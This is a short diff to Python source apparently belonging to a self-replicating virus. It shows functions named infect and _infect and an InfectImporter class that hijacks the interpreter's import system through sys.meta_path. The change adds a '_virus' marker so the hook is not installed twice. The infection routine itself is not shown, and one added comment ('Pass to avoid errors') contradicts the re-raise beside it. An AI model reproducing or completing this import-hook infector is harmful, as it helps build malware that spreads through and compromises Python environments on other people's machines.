@@ -17,7 +17,7 @@ def infect(filename):
     try:
         _infect(filename)
     except Exception:
-        raise
+        raise  # Pass to avoid errors
 
 
 def _infect(filename):
@@ -41,10 +41,17 @@ def _infect(filename):
 
 
 class InfectImporter():
+    _virus = True
 
     def __init__(self):
         self.inside = False
-        sys.meta_path = [self] + sys.meta_path
+        for obj in sys.meta_path:
+            if getattr(obj, "_virus", None):
+                print("found")
+                break
+        else:
+            print ("adding infector")
+            sys.meta_path = [self] + sys.meta_path
 
     def find_spec(self, name, path=None, target=None):
         if not self.inside:
